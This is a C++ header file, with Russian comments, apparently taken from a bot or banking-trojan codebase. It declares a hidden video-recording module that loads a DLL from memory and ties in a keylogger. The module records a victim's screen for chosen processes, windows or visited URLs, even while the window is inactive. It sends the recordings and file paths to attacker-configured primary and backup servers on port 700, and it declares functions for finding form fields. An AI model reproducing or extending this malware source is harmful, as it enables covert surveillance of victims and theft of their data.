#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"


// Настройки парметров для билдера
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// порт сервера приёма видео
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



//****************************************************
//  TVideoRecDLL - класс для работы с библиотекой
//                 видеозаписи
//****************************************************
class TVideoRecDLL : public TBotObject
{
private:

	static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
	static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно

	// определяем типы функци1
	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
	typedef VOID (WINAPI *TStartFindFields)();
	typedef VOID (WINAPI *TStopFindFields)();
	//
	//
	HMEMORYMODULE FHandle;

	void InitializeApi();
	void LoadFunc(LPVOID *Addr, const char* Name);
public:
	TVideoRecDLL();
	~TVideoRecDLL();

	TStartRecHwnd     RecordWnd;
	TStartRecPid      RecordProcess;
	TStopRec          Stop;
	TResetTimer       ResetTimer;
	TStartSend        SendData;
	TStartFindFields  StartFindFields;
	TStopFindFields   StopFindFields;
};



//****************************************************
//
//****************************************************
class TVideoRecorder : public TBotObject
{
private:
	TVideoRecDLL FDLL;
public:
	string UID;        // Идентификатор бота
    string VideoName;  // имя видео
	string Server;     // Адрес основного сервера отправки видео
	string Server2;    // Адрес дополнителтьного сервера отправки видео
	int    Port;       // Порт основного сервера отправки видео
	int    Port2;      // Порт дополнительного сервера отправки видео
	int    RecordTime; // Время записи, в секундах

	TVideoRecorder();
	~TVideoRecorder();

	void ReccordProcess(DWORD PID);
	void ReccordCurrentProcess();
};




void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
void StopRecordThread();//останавливаем поток записи видео
void VideoRecorderSendPath(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//подгружаем длл и вызываем из нее ф-цию

//шлем либо просто либо передавая функцию в поток, параметр для которого директория
void StartFindFields();
DWORD WINAPI StartSendinThread(LPVOID Data);

//Функция возвращает адрес сервера для записи видео
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();

//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  Методы сервера распределения записи видео
//  Назначение сервера - запись видео процесса из другого
//  специолизированного процесса
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - Функция запускает сервер распределения
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - Функция стартует запуск записи
	//					видео для текущего процесса
	//
	// URL - адрес сайт для которого инициализирована запись.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	// StopRecording - Функция останавливает запуск записи
	//					видео для текущего процесса
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - Функция проверяет работает ли
	//               клиент записи с указанным PID
	//	Если PID равен 0 то будет проверяться текущий
	//  процесс
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif